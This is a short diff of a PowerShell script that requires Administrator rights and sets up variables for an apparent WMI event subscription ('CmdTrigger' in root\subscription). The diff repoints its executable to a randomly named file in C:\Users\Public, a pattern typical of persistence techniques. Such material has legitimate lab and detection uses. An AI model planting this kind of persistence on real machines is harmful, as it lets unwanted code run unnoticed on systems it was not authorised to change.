@@ -3,7 +3,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Write-Error "Please run as Administrator."; break
 }
 
-$ExePath = "C:\Users\acebird\CreateFile.exe"
+$ExePath = "C:\Users\Public\c723561.exe"
 $Name = "CmdTrigger"
 $Sub = "root\subscription"
 
